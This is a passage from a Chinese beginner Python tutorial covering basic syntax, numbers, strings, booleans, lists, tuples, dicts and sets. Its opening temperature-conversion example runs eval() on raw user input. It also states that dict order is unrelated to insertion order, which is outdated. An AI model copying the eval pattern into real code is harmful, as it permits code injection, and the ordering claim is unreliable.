class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># TempConvert.py</span><br><span class="line">TempStr = input(&quot;请输入带有符号的温度值：&quot;)</span><br><span class="line">if TempStr[-1] in [&#x27;F&#x27;,&#x27;f&#x27;]:</span><br><span class="line">  C = (eval(TempStr[0:-1]) - 32)/1.8</span><br><span class="line">  print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))</span><br><span class="line">elif TempStr[-1] in [&#x27;C&#x27;,&#x27;c&#x27;]:</span><br><span class="line">  F = 1.8*eval(TempStr[0:-1]) + 32</span><br><span class="line">  print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))</span><br><span class="line">else:</span><br><span class="line">  print(&quot;输入格式错误！&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>? 现在看不懂没关系，有个印象就可以了，学习完下面 Python 基础，再回来瞧瞧就会更清晰啦！</p></blockquote><h2 id="1-3-Python-基础"><a href="#1-3-Python-基础" class="headerlink" title="1.3 Python 基础"></a>1.3 Python 基础</h2><p>Python 是一种计算机编程语言。计算机编程语言和我们日常使用的自然语言有所不同，最大的区别就是，自然语言在不同的语境下有不同的理解，而计算机要根据编程语言执行任务，就必须保证编程语言写出的程序决不能有歧义，所以，任何一种编程语言都有自己的一套语法，编译器或者解释器就是负责把符合语法的程序代码转换成 CPU 能够执行的机器码，然后执行。Python 也不例外。</p><p>Python 的语法比较简单，采用缩进方式，写出来的代码就像下面的样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># print absolute value of an integer:</span><br><span class="line">a = 100</span><br><span class="line">if a &gt;= 0:</span><br><span class="line">    print(a)</span><br><span class="line">else:</span><br><span class="line">    print(-a)</span><br></pre></td></tr></table></figure><p>以 <code>#</code> 开头的语句是注释，注释是给人看的，可以是任意内容，解释器会忽略掉注释。其他每一行都是一个语句，当语句以冒号<code>:</code>结尾时，缩进的语句视为代码块。</p><p>缩进有利有弊。好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的惯例，<strong>应该始终坚持使用 4 个空格的缩进。</strong></p><p>缩进的另一个好处是强迫你写出缩进较少的代码，你会倾向于把一段很长的代码拆分成若干函数，从而得到缩进较少的代码。</p><p>缩进的坏处就是“复制－粘贴”功能失效了，这是最坑爹的地方。当你重构代码时，粘贴过去的代码必须重新检查缩进是否正确。此外，IDE 很难像格式化 Java 代码那样格式化 Python 代码。</p><p>最后，请务必注意，Python 程序是<code>大小写敏感</code>的，如果写错了大小写，程序会报错。</p><h3 id="1-3-1-数据类型"><a href="#1-3-1-数据类型" class="headerlink" title="1.3.1 数据类型"></a>1.3.1 数据类型</h3><p><strong>数据类型</strong>：供计算机程序理解的<code>数据形式</code></p><p>计算机顾名思义就是可以做数学计算的机器，因此，计算机程序理所当然地可以处理各种数值。但是，计算机能处理的远不止数值，还可以处理文本、图形、音频、视频、网页等各种各样的数据，不同的数据，需要定义不同的数据类型。在 Python 中，能够直接处理的数据类型有以下几种：</p><ul><li>整数</li><li>浮点数</li><li>字符串</li><li>布尔值 True &#x2F; False</li><li>空值 None</li><li>列表 list &#x2F; tuple</li><li>字典 dict &#x2F; set</li><li>自定义数据类型</li></ul><h4 id="①-整数"><a href="#①-整数" class="headerlink" title="① 整数"></a>① 整数</h4><p>Python 可以处理任意大小的整数，当然包括负整数，在程序中的表示方法和数学上的写法一模一样。</p><p>例如：<code>1</code>，<code>100</code>，<code>-8080</code>，<code>0</code>，等等。</p><p>计算机由于使用<code>二进制</code>，所以，有时候用十六进制表示整数比较方便，十六进制用 <code>0x</code> 前缀和 0 - 9， a - f 表示。</p><p>例如：<code>0xff00</code>，<code>0xa5b4c3d2</code>，等等。</p><h4 id="②-浮点数"><a href="#②-浮点数" class="headerlink" title="② 浮点数"></a>② 浮点数</h4><p>浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，比如，1.23x10^9 和 12.3x10^8 是完全相等的。浮点数可以用数学写法，如 1.23，3.14，-9.01，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，把 10 用 e 替代， 1.23x10^9 就是 1.23e9，或者 12.3e8，0.000012 可以写成 1.2e-5，等等。</p><p>整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。</p><blockquote><p>注意：</p></blockquote><p>在 Python 中，有两种除法，一种除法是 <code>/</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(10 / 3)</span><br><span class="line"># 输出 3.3333333333333335</span><br></pre></td></tr></table></figure><p><code>/</code> 除法计算结果是浮点数，即使是两个整数恰好整除，结果也是浮点数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(9 / 3)</span><br><span class="line"># 输出 3.0</span><br></pre></td></tr></table></figure><p>还有一种除法是 <code>//</code>，称为地板除，两个整数的除法仍然是整数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(10 // 3)</span><br><span class="line"># 输出 3</span><br></pre></td></tr></table></figure><p>你没有看错，整数的地板除 <code>//</code> 永远是整数，即使除不尽。要做精确的除法，使用 <code>/</code> 就可以。</p><p>因为 <code>//</code> 除法只取结果的整数部分，所以 Python 还提供一个余数运算，可以得到两个整数相除的余数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(10 % 3)</span><br><span class="line"># 输出 1</span><br></pre></td></tr></table></figure><p>无论整数做 <code>//</code> 除法还是取余数，结果永远是整数，所以，整数运算结果永远是精确的。</p><h4 id="③-字符串"><a href="#③-字符串" class="headerlink" title="③ 字符串"></a>③ 字符串</h4><p><strong>字符串</strong>：由 0 个或多个字符组成的有序字符序列。</p><ul><li>字符串是以单引号 <code>&#39;</code> 或双引号 <code>&quot;</code> 括起来的任意文本，比如 <code>&#39;abc&#39;</code>，<code>&quot;xyz&quot;</code> 等等。请注意，<code>&#39;&#39;</code> 或 <code>&quot;&quot;</code> 本身只是一种表示方式，不是字符串的一部分，因此，字符串 <code>&#39;abc&#39;</code> 只有 <code>a</code>，<code>b</code>，<code>c</code> 这3个字符。如果 <code>&#39;</code> 本身也是一个字符，那就可以用 <code>&quot;&quot;</code> 括起来，比如 <code>&quot;I&#39;m OK&quot;</code> 包含的字符是 <code>I</code>，<code>&#39;</code>，<code>m</code>， 空格，<code>O</code>，<code>K</code> 这 6 个字符。</li><li>字符串是字符的有序序列，可以对其中的字符进行索引。</li></ul><p>如果字符串内部既包含 <code>&#39;</code> 又包含 <code>&quot;</code> 怎么办？可以用转义字符 <code>\</code> 来标识，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span><br></pre></td></tr></table></figure><p>表示的字符串内容是：</p><p><code>I&#39;m &quot;OK&quot;!</code></p><p>转义字符 <code>\</code> 可以转义很多字符，比如 <code>\n</code> 表示换行，<code>\t</code> 表示制表符，字符 <code>\</code> 本身也要转义，所以 <code>\\</code> 表示的字符就是 <code>\</code>。</p><p>如果字符串里面有很多字符都需要转义，就需要加很多 <code>\</code>，为了简化，Python 还允许用 <code>r &#39;...&#39;</code> 表示，<code>&#39;...&#39;</code> 内部的字符串默认不转义，可以自己试试：</p><p>? 示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;\\\t\\&#x27;)</span><br><span class="line"># 输出：\       \</span><br><span class="line">print(r&#x27;\\\t\\&#x27;)</span><br><span class="line"># 输出：\\\t\\</span><br></pre></td></tr></table></figure><p>如果字符串内部有很多换行，用 <code>\n</code> 写在一行里不好阅读，为了简化，Python 允许用 <code>&#39;&#39;&#39;...&#39;&#39;&#39;</code> 的格式表示多行内容，可以自己试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;&#x27;&#x27;line1</span><br><span class="line">line2</span><br><span class="line">line3&#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200610222140.png" alt="image-20200610222139397" title="image-20200610222139397"></p><blockquote><p>字符串的使用：</p></blockquote><p><strong>使用 [] 获取字符串中一个或多个字符</strong></p><ul><li>索引：返回字符串中单个字符 <code>&lt;字符串&gt;[M]</code></li><li>切片：返回字符串中一段字符子串 <code>&lt;字符串&gt;[M:N]</code></li></ul><h4 id="④-布尔值"><a href="#④-布尔值" class="headerlink" title="④ 布尔值"></a>④ 布尔值</h4><p>布尔值和布尔代数的表示完全一致，一个布尔值只有 <code>True</code>、<code>False</code> 两种值，要么是 <code>True</code>，要么是 <code>False</code>，在 Python 中，可以直接用 <code>True</code>、<code>False</code> 表示布尔值（请注意大小写），也可以通过布尔运算计算出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(3 &gt; 2)</span><br><span class="line">print(3 &gt; 5)</span><br><span class="line">print(True)</span><br><span class="line">print(False)</span><br></pre></td></tr></table></figure><p>布尔值可以用 <code>and</code>、<code>or</code> 和 <code>not</code> 运算。</p><p><code>and</code> 运算是与运算，只有所有都为 <code>True</code>，<code>and</code> 运算结果才是 <code>True</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(True and True) # True</span><br><span class="line">print(True and False) # False</span><br><span class="line">print(False and False) # False</span><br><span class="line">print(5 &gt; 3 and 3 &gt; 1) # True</span><br></pre></td></tr></table></figure><p><code>or</code> 运算是或运算，只要其中有一个为 <code>True</code>，<code>or</code> 运算结果就是 <code>True</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(True or False) # True</span><br><span class="line">print(5 &lt; 3 or 1 &gt; 3) # False</span><br></pre></td></tr></table></figure><p><code>not</code> 运算是非运算，它是一个单目运算符，把 <code>True</code> 变成 <code>False</code>，<code>False</code> 变成 <code>True</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(not True) # False</span><br><span class="line">print(not 1 &gt; 3) # True</span><br></pre></td></tr></table></figure><p>布尔值经常用在条件判断中，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">age = int(input())</span><br><span class="line">if age &gt;= 18:</span><br><span class="line">    print(&#x27;adult&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;teenager&#x27;)</span><br></pre></td></tr></table></figure><h4 id="⑤-空值"><a href="#⑤-空值" class="headerlink" title="⑤ 空值"></a>⑤ 空值</h4><p>空值是 Python 里一个特殊的值，用 <code>None</code> 表示。<code>None</code> 不能理解为 <code>0</code>，因为 <code>0</code> 是有意义的，而 <code>None</code> 是一个特殊的空值。</p><p>此外，Python 还提供了列表、字典等多种数据类型，还允许创建自定义数据类型，我们后面会继续讲到。</p><h4 id="⑥-列表"><a href="#⑥-列表" class="headerlink" title="⑥ 列表"></a>⑥ 列表</h4><h5 id="Ⅰ-可变的有序列表-list"><a href="#Ⅰ-可变的有序列表-list" class="headerlink" title="Ⅰ 可变的有序列表 list [ ]"></a>Ⅰ 可变的有序列表 list [ ]</h5><p>Python 内置的一种数据类型是列表：list，list 是一种有序的集合，可以随时<code>添加</code>和<code>删除</code>其中的元素。</p><ul><li><strong>创建</strong></li></ul><p>比如，列出班里所有同学的名字，就可以用一个 list 表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classmates = [&#x27;Michael&#x27;,&#x27;Bob&#x27;,&#x27;Tracy&#x27;]</span><br><span class="line">print(classmates) # 输出 [&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;]</span><br></pre></td></tr></table></figure><p>变量 <code>classmates</code> 就是一个 list。用 <code>len()</code> 函数可以获得 list 元素的个数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(len(classmates)) # 输出 3</span><br></pre></td></tr></table></figure><p>? list 里面的元素的数据类型可以不同，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L = [&#x27;Apple&#x27;, 123, True]</span><br></pre></td></tr></table></figure><p>list 元素也可以是 另一个 list，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = [&#x27;Python&#x27;, &#x27;Java&#x27;, [&#x27;C&#x27;, &#x27;C++&#x27;], &#x27;C#&#x27;]</span><br><span class="line">print(s) # [&#x27;Python&#x27;, &#x27;Java&#x27;, [&#x27;C&#x27;, &#x27;C++&#x27;], &#x27;C#&#x27;]</span><br><span class="line">print(len(s)) # 4</span><br></pre></td></tr></table></figure><p>要注意 <code>s</code> 只有 4 个元素，其中 <code>s[2]</code> 又是一个 list，如果拆开写就更容易理解了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = [&#x27;C&#x27;, &#x27;C++&#x27;]</span><br><span class="line">s = [&#x27;Python&#x27;, &#x27;Java&#x27;, p, &#x27;C#&#x27;]</span><br><span class="line">print(s) # [&#x27;Python&#x27;, &#x27;Java&#x27;, [&#x27;C&#x27;, &#x27;C++&#x27;], &#x27;C#&#x27;]</span><br><span class="line">print(len(s)) # 4</span><br></pre></td></tr></table></figure><p>要拿到<code>&#39;C++&#39;</code>可以写 <code>p[1]</code> 或者 <code>s[2][1]</code>，因此 <code>s</code> 可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。</p><p>如果一个 list 中一个元素也没有，就是一个空的 list，它的长度为0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L = []</span><br><span class="line">print(len(L)) # 0</span><br></pre></td></tr></table></figure><ul><li><strong>访问</strong></li></ul><p>用索引来访问 list 中每一个位置的元素，记得索引是从 <code>0</code> 开始的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classmates = [&#x27;Michael&#x27;,&#x27;Bob&#x27;,&#x27;Tracy&#x27;]</span><br><span class="line">print(classmates[0]) # 输出 Michael</span><br></pre></td></tr></table></figure><p>当索引超出了范围时，Python 会报一个 <code>IndexError</code> 错误，所以，要确保索引不要越界，记得最后一个元素的索引是 <code>len(classmates) - 1</code>。</p><p>? 如果要取最后一个元素，除了计算索引位置外，还可以用 <code>-1</code> 做索引，直接获取最后一个元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classmates = [&#x27;Michael&#x27;,&#x27;Bob&#x27;,&#x27;Tracy&#x27;]</span><br><span class="line">print(classmates[-1]) # 输出 Tracy</span><br></pre></td></tr></table></figure><p>以此类推，可以获取倒数第 2 个、倒数第 3 个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">classmates = [&#x27;Michael&#x27;,&#x27;Bob&#x27;,&#x27;Tracy&#x27;]</span><br><span class="line">print(classmates[-1]) # Tracy</span><br><span class="line">print(classmates[-2]) # Bob</span><br><span class="line">print(classmates[-3]) # Michael</span><br></pre></td></tr></table></figure><ul><li><strong>插入</strong></li></ul><p>list 是一个可变的有序表，所以，可以利用 <code>append</code> 往 list 中追加元素到末尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates.append(&#x27;WuGenQiang&#x27;)</span><br></pre></td></tr></table></figure><p>也可以利用 <code>insert</code> 把元素插入到指定的位置，比如索引号为<code>1</code>的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates.insert(1,&#x27;MengLinLin&#x27;)</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611164620.png" alt="image-20200611164619720" title="image-20200611164619720"></p><ul><li><strong>删除</strong></li></ul><p>要删除 list 末尾的元素，用 <code>pop()</code> 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates.pop()</span><br></pre></td></tr></table></figure><p>要删除指定位置的元素，用 <code>pop(i)</code> 方法，其中 <code>i</code> 是索引位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates.pop(1)</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611165044.png" alt="image-20200611165043478" title="image-20200611165043478"></p><ul><li><strong>替换</strong></li></ul><p>要把某个元素替换成别的元素，可以直接赋值给对应的索引位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates[1] = &#x27;Oliver&#x27;</span><br></pre></td></tr></table></figure><h5 id="Ⅱ-不可变有序列表-元组-tuple"><a href="#Ⅱ-不可变有序列表-元组-tuple" class="headerlink" title="Ⅱ 不可变有序列表 - 元组 tuple ( )"></a>Ⅱ 不可变有序列表 - 元组 tuple ( )</h5><p>另一种有序列表叫元组：tuple。tuple 和 list 非常类似，但是 tuple 一旦初始化就不能修改，比如同样是列出同学的名字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classmates = (&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;)</span><br></pre></td></tr></table></figure><p>现在，classmates 这个 tuple 不能变了，它也没有 append()，insert() 这样的方法。其他获取元素的方法和 list 是一样的，你可以正常地使用 <code>classmates[0]</code>，<code>classmates[-1]</code>，但不能赋值成另外的元素。</p><p>!&gt; 不可变的 tuple 有什么意义？因为 tuple 不可变，所以代码更安全。如果可能，能用 tuple 代替 list 就尽量用 tuple。</p><p>? <strong>tuple 的陷阱</strong>：当你定义一个 tuple 时，在定义的时候，tuple 的元素就必须被确定下来，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = (1, 2)</span><br><span class="line">print(t) # (1, 2)</span><br></pre></td></tr></table></figure><p>如果要定义一个空的 tuple，可以写成 <code>()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = ()</span><br><span class="line">print(t) # ()</span><br></pre></td></tr></table></figure><p>但是，要定义一个只有 1 个元素的 tuple，如果你这么定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = (1)</span><br><span class="line">print(t) # 1</span><br></pre></td></tr></table></figure><p>定义的不是 tuple，是 <code>1</code> 这个数！这是因为括号 <code>()</code> 既可以表示 tuple，又可以表示数学公式中的小括号，这就产生了歧义，因此，<strong>Python 规定，这种情况下，按小括号进行计算</strong>，计算结果自然是 <code>1</code>。</p><p>所以，<strong>只有 1 个元素的 tuple 定义时必须加一个逗号<code>,</code>，来消除歧义</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = (1,)</span><br><span class="line">print(t) # (1,)</span><br></pre></td></tr></table></figure><p>?&gt; Python 在显示只有 1 个元素的 tuple 时，也会加一个逗 <code>,</code>，以免你误解成数学计算意义上的括号。</p><p>最后来看一个 <strong>“可变的” tuple</strong> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t = (&#x27;a&#x27;, &#x27;b&#x27;, [&#x27;A&#x27;, &#x27;B&#x27;])</span><br><span class="line">t[2][0] = &#x27;X&#x27;</span><br><span class="line">t[2][1] = &#x27;Y&#x27;</span><br><span class="line">print(t) # (&#x27;a&#x27;, &#x27;b&#x27;, [&#x27;X&#x27;, &#x27;Y&#x27;])</span><br></pre></td></tr></table></figure><p>这个 tuple 定义的时候有 3 个元素，分别是<code>&#39;a&#39;</code>，<code>&#39;b&#39;</code>和一个 list。不是说 tuple 一旦定义后就不可变了吗？怎么后来又变了？</p><p>别急，我们先看看定义的时候 tuple 包含的 3 个元素：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611170359.png" alt="image-20200611170358099" title="image-20200611170358099"></p><p>当我们把 list 的元素 <code>&#39;A&#39;</code> 和 <code>&#39;B&#39;</code> 修改为 <code>&#39;X&#39;</code> 和 <code>&#39;Y&#39;</code> 后，tuple 变为：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611170516.png" alt="image-20200611170515905" title="image-20200611170515905"></p><p>表面上看，tuple 的元素确实变了，但其实变的不是 tuple 的元素，而是 list 的元素。tuple 一开始指向的 list 并没有改成别的 list，所以，⭐ <strong>tuple 所谓的 “不变” 是说，tuple 的每个元素，指向永远不变。即指向 <code>&#39;a&#39;</code>，就不能改成指向 <code>&#39;b&#39;</code>，指向一个 list，就不能改成指向其他对象，但指向的这个 list 本身是可变的！</strong></p><p>理解了 “指向不变” 后，要创建一个内容也不变的 tuple 怎么做？那就必须保证 tuple 的每一个元素本身也不能变。</p><h4 id="⑦-字典"><a href="#⑦-字典" class="headerlink" title="⑦ 字典"></a>⑦ 字典</h4><h5 id="Ⅰ-dict（key-value）"><a href="#Ⅰ-dict（key-value）" class="headerlink" title="Ⅰ dict（key - value） { }"></a>Ⅰ dict（key - value） { }</h5><p>Python 内置了字典：dict 的支持，dict 全称 dictionary，在其他语言中也称为 map，使用键 - 值（key - value）存储，具有极快的查找速度。</p><ul><li><strong>创建</strong></li></ul><p>示例代码：学生姓名和成绩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#x27;Michael&#x27;: 95, &#x27;Bob&#x27;: 75, &#x27;Tracy&#x27;: 85&#125;</span><br><span class="line">print(d) # &#123;&#x27;Michael&#x27;: 95, &#x27;Bob&#x27;: 75, &#x27;Tracy&#x27;: 85&#125;</span><br><span class="line">print(d[&#x27;Michael&#x27;]) # 95</span><br><span class="line"></span><br><span class="line">print(d[0]) # KeyError: 0</span><br></pre></td></tr></table></figure><p>为什么 dict 查找速度这么快？因为 dict 的实现原理和查字典是一样的。假设字典包含了 1 万个汉字，我们要查某一个字，一个办法是把字典从第一页往后翻，直到找到我们想要的字为止，这种方法就是在 list 中查找元素的方法，list 越大，查找越慢。</p><p>第二种方法是先在字典的索引表里（比如部首表）查这个字对应的页码，然后直接翻到该页，找到这个字。无论找哪个字，这种查找速度都非常快，不会随着字典大小的增加而变慢。</p><p>dict 就是第二种实现方式，给定一个名字，比如<code>&#39;Michael&#39;</code>，dict 在内部就可以直接计算出 <code>Michael</code> 对应的存放成绩的 “页码”，也就是 <code>95</code> 这个数字存放的内存地址，直接取出来，所以速度非常快。</p><p>把数据放入 dict 的方法，除了初始化时指定外，还可以通过 key 放入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d[&#x27;Adam&#x27;] = 67</span><br><span class="line">print(d[&#x27;Adam&#x27;]) # 67</span><br><span class="line">print(d) # &#123;&#x27;Michael&#x27;: 95, &#x27;Bob&#x27;: 75, &#x27;Tracy&#x27;: 85, &#x27;Adam&#x27;: 67&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>判断 value 是否存在</strong></li></ul><p>由于一个 key 只能对应一个 value，所以，多次对一个 key 放入 value，后面的值会把前面的值冲掉：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d[&#x27;Adam&#x27;] = 67</span><br><span class="line">print(d[&#x27;Adam&#x27;]) # 67</span><br><span class="line">d[&#x27;Adam&#x27;] = 97</span><br><span class="line">print(d[&#x27;Adam&#x27;]) # 97</span><br></pre></td></tr></table></figure><p>如果 key 不存在，dict 就会报错：<code>KeyError</code>。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611172244.png" alt="image-20200611172243031" title="image-20200611172243031"></p><p>要避免 key 不存在的错误，有两种办法，一是通过<code>in</code>判断 key 是否存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;Thomas&#x27; in d) # False</span><br></pre></td></tr></table></figure><p>二是通过 dict 提供的 <code>get()</code> 方法，如果 key 不存在，可以返回 <code>None</code>，或者自己指定的 value：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(d.get(&#x27;Thomas&#x27;))  # None</span><br><span class="line">print(d.get(&#x27;Thomas&#x27;, -1))  # -1</span><br></pre></td></tr></table></figure><ul><li><strong>删除</strong></li></ul><p>要删除一个 key，用 <code>pop(key)</code> 方法，对应的 value 也会从 dict 中删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d.pop(&#x27;Bob&#x27;)</span><br></pre></td></tr></table></figure><p>!&gt; 请务必注意，dict 内部存放的顺序和 key 放入的顺序是没有关系的。</p><p>⭐ 和 list 比较，dict 有以下几个特点：</p><ul><li>查找和插入的速度极快，不会随着 key 的增加而变慢；</li><li>需要占用大量的内存，内存浪费多。</li></ul><p>而 list 相反：</p><ul><li>查找和插入的时间随着元素的增加而增加；</li><li>占用空间小，浪费内存很少。</li></ul><p>所以，dict 是用空间来换取时间的一种方法。</p><p>dict 可以用在需要高速查找的很多地方，在 Python 代码中几乎无处不在，正确使用 dict 非常重要，需要牢记的第一条就是 dict 的 key 必须是<strong>不可变对象</strong>。</p><p>这是因为 dict 根据 key 来计算 value 的存储位置，如果每次计算相同的 key 得出的结果不同，那 dict 内部就完全混乱了。这个通过 key 计算位置的算法称为哈希算法（Hash）。</p><p>要保证 hash 的正确性，作为 key 的对象就不能变。在 Python 中，字符串、整数等都是不可变的，因此，可以放心地作为 key。而 list 是可变的，就不能作为 key：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200611173458.png" alt="image-20200611173457932" title="image-20200611173457932"></p><h5 id="Ⅱ-set（key，且-key-不可重复）"><a href="#Ⅱ-set（key，且-key-不可重复）" class="headerlink" title="Ⅱ set（key，且 key 不可重复） ([ ])"></a>Ⅱ set（key，且 key 不可重复） ([ ])</h5><p>set 和 dict 类似，也是一组 key 的集合，但不存储 value。由于 key 不能重复，所以，在 set 中，没有重复的 key。</p><p>set 和 dict 的唯一区别仅在于没有存储对应的 value，但是，set 的原理和 dict 一样，所以，同样<strong>不可以放入可变对象</strong>，因为无法判断两个可变对象是否相等，也就无法保证 set 内部 “不会有重复元素”。</p><ul><li><strong>创建</strong></li></ul><p>要创建一个 set，需要提供一个 list 作为输入集合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = set([1, 2, 3])</span><br><span class="line">print(s) # &#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><p>注意，传入的参数 <code>[1, 2, 3]</code> 是一个 list，而显示的 <code>&#123;1, 2, 3&#125;</code> 只是告诉你这个 set 内部有 1，2，3 这 3 个元素，显示的顺序也不表示 set 是有序的。</p><p><strong>重复元素在 set 中自动被过滤：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 